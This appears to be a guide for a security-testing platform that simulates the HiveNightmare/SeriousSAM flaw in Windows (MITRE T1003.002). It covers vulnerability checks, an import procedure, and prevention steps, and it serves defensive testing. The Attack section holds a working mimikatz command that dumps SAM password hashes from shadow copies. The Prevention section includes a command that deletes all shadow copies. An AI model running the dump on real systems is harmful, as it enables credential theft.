# T1003.002 - OS Credential Dumping: Security Account Manager

On July 19, 2021, @jonasLyk noticed the SAM file is readable by all users. Upon further investigation, a number of Windows versions allowed any user to read the SAM file.

## Check if system is vulnerable
As a non-administrative user, run the following in a command prompt
- ```whoami /groups```
- ```sc query vss```
- ```vssadmin list shadows```
- ```icacls %windir%\system32\config\sam```

A vulnerable system will report ```BUILTIN\Users:(I)(RX)```

## Import the Compound Action
1. Click Threat Manager - Migrate Threats
2. Under "Import Threat" click “Choose File” and select the JSON file you downloaded from GitHub
3. Click Import and OK when complete
4. Click Threat Manager - Threat Catalog
5. Find the imported Compound Action and click the tag icon 
6. Tag the MITRE ATT&CK Technique for the Compound Action

## Attack
1. Create a new campaign
2. Select the Compound Action for T1003.002
Note: you may need to change the HarddiskVolumeShadowCopy#
```mimikatz "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\system /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\system32\config\\sam"```

## Prevention
Restrict access to sam, system, and security files and remove VSS shadow copies. On a command prompt with administrative privileges:
- ```icacls %windir%\system32\config\sam /remove "Users"```
- ```icacls %windir%\system32\config\security /remove "Users"```
- ```icacls %windir%\system32\config\system /remove "Users"```
- ```vssadmin delete shadows /for=c: /Quiet```
- ```vssadmin list shadows```

## References
- https://twitter.com/jonasLyk/status/1417205166172950531
- https://www.kb.cert.org/vuls/id/506989
- https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5
- https://github.com/GossiTheDog/HiveNightmare